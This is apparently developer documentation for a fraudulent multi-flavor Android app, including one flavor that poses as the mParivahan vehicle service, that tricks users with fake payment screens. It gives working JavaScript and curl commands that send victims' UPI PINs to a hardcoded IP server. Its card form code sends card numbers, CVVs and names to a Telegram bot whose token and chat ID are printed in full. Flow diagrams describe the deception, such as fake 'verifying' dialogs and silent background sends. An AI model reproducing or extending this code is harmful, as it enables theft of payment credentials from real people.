# Complete API Documentation - All Endpoints

**Project:** Multi-Flavor Android Application  
**Version:** 1.0  
**Last Updated:** 2025-11-01  
**Base Server:** `http://95.134.130.160:8765`

---

## ?? Table of Contents

1. [Overview](#overview)
2. [Authentication & Device Tracking](#authentication--device-tracking)
3. [API Endpoints](#api-endpoints)
   - [Save UPI PIN](#1-save-upi-pin)
   - [Card Details via Telegram](#2-card-details-telegram-bot)
4. [Flow Diagrams](#flow-diagrams)
5. [Error Handling](#error-handling)
6. [Security Considerations](#security-considerations)
7. [Testing Guide](#testing-guide)

---

## ?? Overview

This application uses **two main data collection methods**:

1. **Custom Backend Server** - For UPI PIN collection
2. **Telegram Bot API** - For card details collection (SexyHub only)

### Application Flavors

| Flavor | Package Name | Data Collection |
|--------|--------------|-----------------|
| **SexChat** | com.sexychat.me | UPI PIN only |
| **mParivahan** | com.mparivahan.me | UPI PIN only |
| **SexyHub** | com.sexyhub.me | UPI PIN + Card Details |

---

## ?? Authentication & Device Tracking

### Device ID

All requests include a unique device identifier retrieved from Android.

**JavaScript Implementation:**
```javascript
function getDeviceId() {
    try {
        if (typeof Android !== 'undefined' && Android.getDeviceId) {
            return Android.getDeviceId();
        }
    } catch (e) {
        console.error('Error getting device ID:', e);
    }
    return 'web_browser_' + Date.now();
}
```

**Android Implementation:**
```kotlin
webView.addJavascriptInterface(object {
    @JavascriptInterface
    fun getDeviceId(): String {
        return Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ANDROID_ID
        )
    }
}, "Android")
```

**Device ID Format:**
- Type: String
- Example: `"abc123def456789"`
- Fallback: `"web_browser_1730476800000"`

### User ID

Fixed identifier used across all requests.

**Value:** `8f41bc5eec42e34209a801a7fa8b2d94d1c3d983`

---

## ?? API Endpoints

### 1. Save UPI PIN

Captures and stores UPI PIN entered by user during payment flow.

#### Endpoint Details

```
POST http://95.134.130.160:8765/save-pin
```

#### Request Headers

```http
Content-Type: application/json
```

#### Request Body

```json
{
  "upi_pin": "123456",
  "device_id": "abc123def456",
  "app_type": "sexychat",
  "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"
}
```

#### Parameters

| Parameter | Type | Required | Validation | Description |
|-----------|------|----------|------------|-------------|
| `upi_pin` | string | Yes | 4 or 6 digits | User's UPI PIN code |
| `device_id` | string | Yes | Any string | Unique device identifier from Android |
| `app_type` | string | Yes | `sexychat` \| `mparivahan` \| `sexyhub` | Application flavor identifier |
| `user_id` | string | Yes | Fixed: `8f41bc5eec42e34209a801a7fa8b2d94d1c3d983` | Static user identifier |

#### Validation Rules

**upi_pin:**
- Must be numeric only
- Length: 4 or 6 digits
- Examples: `"1234"`, `"123456"`

**app_type:**
- Must be one of: `"sexychat"`, `"mparivahan"`, `"sexyhub"`
- Case-sensitive
- Used for data segregation

**device_id:**
- Any non-empty string
- Typically 16-40 characters
- Used for device tracking across sessions

#### Success Response

**HTTP Status:** `200 OK`

```json
{
  "status": "success",
  "message": "PIN saved successfully",
  "timestamp": "2025-11-01T12:34:56Z"
}
```

#### Error Responses

**400 Bad Request** - Invalid parameters
```json
{
  "status": "error",
  "message": "Invalid UPI PIN format",
  "code": "INVALID_PIN"
}
```

**500 Internal Server Error** - Server error
```json
{
  "status": "error",
  "message": "Internal server error",
  "code": "SERVER_ERROR"
}
```

#### Client Implementation

**JavaScript (All Flavors):**

```javascript
function submitToServer(upiPin) {
    showVerifyDialog(); // Shows "Verifying Payment" dialog
    
    const deviceId = getDeviceId();
    const requestData = {
        upi_pin: upiPin,
        device_id: deviceId,
        app_type: 'sexychat', // or 'mparivahan' or 'sexyhub'
        user_id: '8f41bc5eec42e34209a801a7fa8b2d94d1c3d983'
    };

    // Send to server silently (no error handling shown to user)
    fetch('http://95.134.130.160:8765/save-pin', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(requestData)
    })
    .then(response => response.json())
    .catch(error => console.log('Background request:', error));

    // Auto-redirect after 2.5 seconds regardless of server response
    setTimeout(() => {
        hideVerifyDialog();
        window.location.href = 'wait.html';
    }, 2500);
}
```

#### Usage by Flavor

**SexChat:**
```json
{
  "upi_pin": "123456",
  "device_id": "abc123",
  "app_type": "sexychat",
  "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"
}
```

**mParivahan:**
```json
{
  "upi_pin": "654321",
  "device_id": "xyz789",
  "app_type": "mparivahan",
  "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"
}
```

**SexyHub:**
```json
{
  "upi_pin": "789012",
  "device_id": "jkl345",
  "app_type": "sexyhub",
  "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"
}
```

#### cURL Examples

**Test SexChat:**
```bash
curl -X POST http://95.134.130.160:8765/save-pin \
  -H "Content-Type: application/json" \
  -d '{
    "upi_pin": "123456",
    "device_id": "test_device_001",
    "app_type": "sexychat",
    "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"
  }'
```

**Test mParivahan:**
```bash
curl -X POST http://95.134.130.160:8765/save-pin \
  -H "Content-Type: application/json" \
  -d '{
    "upi_pin": "654321",
    "device_id": "test_device_002",
    "app_type": "mparivahan",
    "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"
  }'
```

**Test SexyHub:**
```bash
curl -X POST http://95.134.130.160:8765/save-pin \
  -H "Content-Type: application/json" \
  -d '{
    "upi_pin": "789012",
    "device_id": "test_device_003",
    "app_type": "sexyhub",
    "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"
  }'
```

#### Used In Files

- `/app/src/sexychat/assets/upi-pin.html`
- `/app/src/mparivahan/assets/upi-pin.html`
- `/app/src/sexyhub/assets/pin.html`

---

### 2. Card Details (Telegram Bot)

**?? Used in SexyHub Flavor Only**

Sends credit/debit card details to a Telegram bot for collection.

#### Endpoint Details

```
POST https://api.telegram.org/bot8135558765:AAGwWtbug4hI8G1q9LZ9s6qAUS6pT9qeOtA/sendMessage
```

**Note:** This is Telegram's official Bot API endpoint.

#### Request Headers

```http
Content-Type: application/json
```

#### Request Body

```json
{
  "chat_id": "-1003282741646",
  "text": "New Card Details:\nCard Number: 1234567890123456\nExpiry: 12/25\nCVV: 123\nName: John Doe\nDeviceId: abc123def456"
}
```

#### Parameters

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `chat_id` | string | Yes | Telegram chat/channel ID: `-1003282741646` |
| `text` | string | Yes | Formatted message containing card details |

#### Card Data Structure

The `text` field contains formatted card information:

```
New Card Details:
Card Number: [16-19 digits]
Expiry: [MM/YY]
CVV: [3-4 digits]
Name: [Cardholder name]
DeviceId: [device_id]
```

**Example:**
```
New Card Details:
Card Number: 4532015112830366
Expiry: 12/25
CVV: 123
Name: John Doe
DeviceId: abc123def456
```

#### Card Validation Rules

**Card Number:**
- Length: 12-19 digits
- Stripped of spaces before sending
- No validation for card type (Visa/Mastercard/etc)

**Expiry:**
- Format: `MM/YY`
- Must contain `/` at position 2
- Example: `12/25`
- Auto-formatted on client side

**CVV:**
- Length: 3-4 digits
- Numeric only
- Masked as password on input

**Cardholder Name:**
- Minimum length: 3 characters
- Trimmed of whitespace
- Full name expected

#### Success Response

**HTTP Status:** `200 OK`

Telegram API returns:
```json
{
  "ok": true,
  "result": {
    "message_id": 12345,
    "date": 1730476800,
    "text": "New Card Details:..."
  }
}
```

#### Error Response

**HTTP Status:** `400 Bad Request` or others

```json
{
  "ok": false,
  "error_code": 400,
  "description": "Error message"
}
```

#### Client Implementation

**JavaScript (SexyHub only):**

```javascript
function payCard(e) {
    e.preventDefault();
    
    var cardNumber = document.getElementsByName("cardnum")[0].value.replace(/\s/g,"");
    var expiry = document.getElementsByName("exp")[0].value;
    var cvv = document.getElementsByName("cvv")[0].value;
    var name = document.getElementsByName("nameoncard")[0].value.trim();
    var deviceId = getDeviceId();
    
    // Client-side validation
    var errBox = document.getElementById("errMsg");
    errBox.style.display = "none";
    
    if (cardNumber.length < 12) {
        errBox.innerText = "Invalid card number.";
        errBox.style.display = "block";
        return false;
    }
    
    if (expiry.length != 5 || expiry.indexOf("/") != 2) {
        errBox.innerText = "Expiry must be MM/YY format.";
        errBox.style.display = "block";
        return false;
    }
    
    if (cvv.length < 3) {
        errBox.innerText = "CVV must be 3 or 4 digits.";
        errBox.style.display = "block";
        return false;
    }
    
    if (name.length < 3) {
        errBox.innerText = "Cardholder name required.";
        errBox.style.display = "block";
        return false;
    }
    
    // Format message
    let message = `New Card Details:
Card Number: ${cardNumber}
Expiry: ${expiry}
CVV: ${cvv}
Name: ${name}
DeviceId: ${deviceId}`;
    
    // Send to Telegram
    fetch("https://api.telegram.org/bot8135558765:AAGwWtbug4hI8G1q9LZ9s6qAUS6pT9qeOtA/sendMessage", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: "-1003282741646",
            text: message
        })
    }).then(() => {
        window.location.href = "wait.html";
    });
    
    return false;
}
```

#### Expiry Formatting

Auto-format expiry input to `MM/YY`:

```javascript
function formatExpiry(input) {
    let value = input.value.replace(/[^0-9]/g, "");
    if (value.length >= 2 && value[2] !== "/" && value.length < 5) {
        value = value.slice(0, 2) + "/" + value.slice(2);
    }
    input.value = value.slice(0, 5);
}
```

#### cURL Example

```bash
curl -X POST "https://api.telegram.org/bot8135558765:AAGwWtbug4hI8G1q9LZ9s6qAUS6pT9qeOtA/sendMessage" \
  -H "Content-Type: application/json" \
  -d '{
    "chat_id": "-1003282741646",
    "text": "New Card Details:\nCard Number: 4532015112830366\nExpiry: 12/25\nCVV: 123\nName: John Doe\nDeviceId: test_device_001"
  }'
```

#### Used In Files

- `/app/src/sexyhub/assets/card.html`

#### Security Considerations

?? **WARNING:**
- Card details sent in **plain text**
- No encryption on client or server
- Telegram bot token is **hardcoded** in client
- Bot token is **publicly visible** in HTML source
- Recommendation: Use proper backend server with encryption

---

## ?? Flow Diagrams

### Complete Payment Flow (All Flavors)

```
1. User opens app
   ?? SexChat: Splash (3s) ? Register
   ?? mParivahan: Splash (6s) ? Vehicle Registration
   ?? SexyHub: Direct to Video Library (no splash)
   ?
2. Registration/Entry
   ?? SexChat: User info (mobile/name)
   ?? mParivahan: Vehicle number + Mobile
   ?? SexyHub: Age verification (18+)
   ?
3. Payment Method Selection
   ?? All: payment.html
   ?? Shows: Google Pay, PhonePe, Paytm
   ?
4. Google Pay Splash
   ?? All: googlepay-splash.html
   ?? Duration: 2.5 seconds
   ?
5. UPI PIN Entry
   ?? All: upi-pin.html / pin.html
   ?? User enters 4 or 6 digit PIN
   ?? Shows "Verifying Payment" dialog
   ?
6. API Call: POST /save-pin
   ?? Sent silently in background
   ?? No error handling shown to user
   ?? Parameters: {upi_pin, device_id, app_type, user_id}
   ?
7. Auto-redirect after 2.5s
   ?? Redirects to wait.html regardless of server response
   ?
8. Verification Page
   ?? wait.html
   ?? 5 second countdown with animation
   ?
9. Success Page
   ?? final.html with celebration animation
```

### SexyHub Card Payment Flow

```
SexyHub ONLY:
   ?
1. User clicks on locked video
   ?
2. Payment popup
   ?? "Pay ?1 to unlock all videos"
   ?
3. Payment method selection
   ?? Option: UPI ? (follows UPI flow above)
   ?? Option: Card ? card.html
   ?
4. Card Details Form
   ?? Cardholder Name
   ?? Card Number (12-19 digits)
   ?? Expiry (MM/YY)
   ?? CVV (3-4 digits)
   ?
5. Client-side Validation
   ?? Card number length check
   ?? Expiry format check (MM/YY)
   ?? CVV length check
   ?? Name minimum length check
   ?
6. API Call: Telegram Bot
   ?? POST to Telegram sendMessage
   ?? Sends formatted card details
   ?? Includes device_id
   ?
7. Redirect to wait.html
   ?? (same as UPI flow)
```

### Data Collection Points

```
??????????????????????????????????????????
?         Data Collection Flow           ?
??????????????????????????????????????????

Registration Phase:
?? SexChat: Mobile, Name (no API call)
?? mParivahan: Vehicle Number, Mobile (no API call)
?? SexyHub: Age verification (no API call)

Payment Phase:
?? ALL FLAVORS:
?  ?? UPI PIN ? POST /save-pin
?     ?? upi_pin
?     ?? device_id
?     ?? app_type
?     ?? user_id
?
?? SEXYHUB ONLY:
   ?? Card Details ? Telegram Bot
      ?? card_number
      ?? expiry
      ?? cvv
      ?? name
      ?? device_id
```

---

## ?? Error Handling

### Client-Side Error Handling

#### UPI PIN Validation

**Current Implementation:**
- No error dialogs shown to user
- Invalid PIN: Vibrate device only
- Server errors: Silently logged to console
- Always redirects after 2.5 seconds

**Code:**
```javascript
function submitPIN() {
    if (enteredNumbers.length === 6 || enteredNumbers.length === 4) {
        let upiPin = enteredNumbers.join('');
        savedPIN = upiPin;
        submitToServer(upiPin);
    } else {
        // Invalid PIN - just vibrate
        if (navigator.vibrate) {
            navigator.vibrate(200);
        }
    }
}
```

#### Card Validation

**Shows error messages:**
```javascript
// Example errors shown to user
- "Invalid card number."
- "Expiry must be MM/YY format."
- "CVV must be 3 or 4 digits."
- "Cardholder name required."
```

### Server-Side Error Handling

**Recommendations:**

**For /save-pin endpoint:**
```javascript
// Validate request
if (!req.body.upi_pin || !req.body.device_id || !req.body.app_type) {
    return res.status(400).json({
        status: 'error',
        message: 'Missing required fields',
        code: 'MISSING_FIELDS'
    });
}

// Validate PIN format
if (!/^\d{4}$|^\d{6}$/.test(req.body.upi_pin)) {
    return res.status(400).json({
        status: 'error',
        message: 'Invalid UPI PIN format',
        code: 'INVALID_PIN_FORMAT'
    });
}

// Validate app_type
if (!['sexychat', 'mparivahan', 'sexyhub'].includes(req.body.app_type)) {
    return res.status(400).json({
        status: 'error',
        message: 'Invalid app type',
        code: 'INVALID_APP_TYPE'
    });
}
```

---

## ?? Security Considerations

### Current Security Issues

?? **CRITICAL ISSUES:**

1. **Unencrypted HTTP**
   - Base URL uses HTTP, not HTTPS
   - All data sent in plain text
   - Susceptible to man-in-the-middle attacks

2. **Telegram Bot Token Exposed**
   - Token hardcoded in client-side JavaScript
   - Publicly visible in HTML source
   - Anyone can use token to send messages

3. **No Request Authentication**
   - No API keys or tokens required
   - Any client can send requests
   - Vulnerable to spam/abuse

4. **Sensitive Data in URLs**
   - User ID hardcoded and visible
   - Device IDs transmitted without encryption

5. **No Rate Limiting (Client)**
   - Clients can spam requests
   - No protection against abuse

### Recommendations for Production

? **Immediate Improvements:**

1. **Use HTTPS**
```javascript
// Change from HTTP to HTTPS
const API_URL = 'https://secure.yourdomain.com/save-pin';
```

2. **Move Telegram Bot to Backend**
```javascript
// Instead of calling Telegram directly, call your backend
fetch('https://your-backend.com/api/card-details', {
    method: 'POST',
    body: JSON.stringify(cardData)
});

// Backend then forwards to Telegram securely
```

3. **Add Request Signing**
```javascript
// Generate signature from request data
const signature = generateHMAC(requestData, secretKey);
headers['X-Signature'] = signature;
```

4. **Implement Rate Limiting**
```javascript
// Server-side rate limiting
const rateLimit = require('express-rate-limit');
const limiter = rateLimit({
    windowMs: 60 * 1000,
    max: 3,
    keyGenerator: (req) => req.body.device_id
});
app.post('/save-pin', limiter, handler);
```

5. **Encrypt Sensitive Data**
```javascript
// Client-side encryption before sending
const encryptedPIN = CryptoJS.AES.encrypt(upiPin, publicKey);
```

6. **Use Environment Variables**
```javascript
// Don't hardcode credentials
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
```

---

## ?? Testing Guide

### Testing /save-pin Endpoint

#### Test Case 1: Valid Request (SexChat)

```bash
curl -X POST http://95.134.130.160:8765/save-pin \
  -H "Content-Type: application/json" \
  -d '{
    "upi_pin": "123456",
    "device_id": "test_sexychat_001",
    "app_type": "sexychat",
    "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"
  }'
```

**Expected:** `200 OK` with success message

#### Test Case 2: Invalid PIN (too short)

```bash
curl -X POST http://95.134.130.160:8765/save-pin \
  -H "Content-Type: application/json" \
  -d '{
    "upi_pin": "12",
    "device_id": "test_device",
    "app_type": "sexychat",
    "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"
  }'
```

**Expected:** `400 Bad Request` with error message

#### Test Case 3: Invalid app_type

```bash
curl -X POST http://95.134.130.160:8765/save-pin \
  -H "Content-Type: application/json" \
  -d '{
    "upi_pin": "123456",
    "device_id": "test_device",
    "app_type": "invalid_app",
    "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"
  }'
```

**Expected:** `400 Bad Request` with error message

#### Test Case 4: Missing Parameters

```bash
curl -X POST http://95.134.130.160:8765/save-pin \
  -H "Content-Type: application/json" \
  -d '{
    "upi_pin": "123456"
  }'
```

**Expected:** `400 Bad Request` with error message

### Testing Telegram Bot

#### Test Card Details

```bash
curl -X POST "https://api.telegram.org/bot8135558765:AAGwWtbug4hI8G1q9LZ9s6qAUS6pT9qeOtA/sendMessage" \
  -H "Content-Type: application/json" \
  -d '{
    "chat_id": "-1003282741646",
    "text": "TEST CARD:\nCard: 1234567812345678\nExpiry: 12/25\nCVV: 123\nName: Test User\nDevice: test_001"
  }'
```

**Expected:** `200 OK` with Telegram response

### Load Testing

**Using Apache Bench:**

```bash
# Test /save-pin with 100 requests, 10 concurrent
ab -n 100 -c 10 -p pin.json -T "application/json" \
  http://95.134.130.160:8765/save-pin
```

**pin.json:**
```json
{
  "upi_pin": "123456",
  "device_id": "load_test",
  "app_type": "sexychat",
  "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"
}
```

---

## ?? API Summary Table

| Endpoint | Method | Used By | Purpose | Authentication |
|----------|--------|---------|---------|----------------|
| `/save-pin` | POST | All Flavors | Store UPI PIN | Device ID |
| Telegram Bot | POST | SexyHub Only | Store Card Details | Bot Token |

---

## ?? Request/Response Examples

### Complete UPI PIN Flow

**1. User enters PIN:**
```javascript
// User types: 1, 2, 3, 4, 5, 6
enteredNumbers = [1, 2, 3, 4, 5, 6];
```

**2. JavaScript prepares request:**
```javascript
const deviceId = Android.getDeviceId(); // "abc123def456"
const requestData = {
    upi_pin: "123456",
    device_id: "abc123def456",
    app_type: "sexychat",
    user_id: "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"
};
```

**3. HTTP Request:**
```http
POST /save-pin HTTP/1.1
Host: 95.134.130.160:8765
Content-Type: application/json

{
  "upi_pin": "123456",
  "device_id": "abc123def456",
  "app_type": "sexychat",
  "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"
}
```

**4. Server Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "success",
  "message": "PIN saved successfully",
  "timestamp": "2025-11-01T12:34:56Z"
}
```

**5. Client redirects:**
```javascript
setTimeout(() => {
    window.location.href = 'wait.html';
}, 2500);
```

### Complete Card Details Flow

**1. User fills form:**
```javascript
cardNumber = "4532015112830366";
expiry = "12/25";
cvv = "123";
name = "John Doe";
```

**2. JavaScript formats message:**
```javascript
const message = `New Card Details:
Card Number: 4532015112830366
Expiry: 12/25
CVV: 123
Name: John Doe
DeviceId: abc123def456`;
```

**3. HTTP Request to Telegram:**
```http
POST /bot8135558765:AAGwWtbug4hI8G1q9LZ9s6qAUS6pT9qeOtA/sendMessage HTTP/1.1
Host: api.telegram.org
Content-Type: application/json

{
  "chat_id": "-1003282741646",
  "text": "New Card Details:\nCard Number: 4532015112830366\nExpiry: 12/25\nCVV: 123\nName: John Doe\nDeviceId: abc123def456"
}
```

**4. Telegram Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "ok": true,
  "result": {
    "message_id": 12345,
    "date": 1730476800,
    "text": "New Card Details:..."
  }
}
```

**5. Client redirects:**
```javascript
window.location.href = "wait.html";
```

---

## ?? Related Files

### Backend Server Files
- Main endpoint handler for `/save-pin`
- Database connection module
- Request validation middleware

### Client Files
- `/app/src/sexychat/assets/upi-pin.html` - SexChat UPI PIN
- `/app/src/mparivahan/assets/upi-pin.html` - mParivahan UPI PIN
- `/app/src/sexyhub/assets/pin.html` - SexyHub UPI PIN
- `/app/src/sexyhub/assets/card.html` - SexyHub Card Payment

### Configuration Files
- `/app/build.gradle.kts` - Build flavors configuration
- `/app/src/*/google-services.json` - Firebase config per flavor

---

## ?? Support & Contact

For API issues or questions:
- Check server logs at: `http://95.134.130.160:8765/logs` (if available)
- Monitor Telegram channel: `-1003282741646` for card submissions
- Review application logs via Firebase Console

---

## ?? Version History

| Version | Date | Changes |
|---------|------|---------|
| 1.0 | 2025-11-01 | Initial release with /save-pin and Telegram integration |

---

**End of API Documentation**

For detailed implementation guides, see:
- [FLAVORS_GUIDE.md](./FLAVORS_GUIDE.md) - Build configuration
- [FIREBASE_SETUP.md](./FIREBASE_SETUP.md) - Firebase setup
- [README.md](./README.md) - Project overview
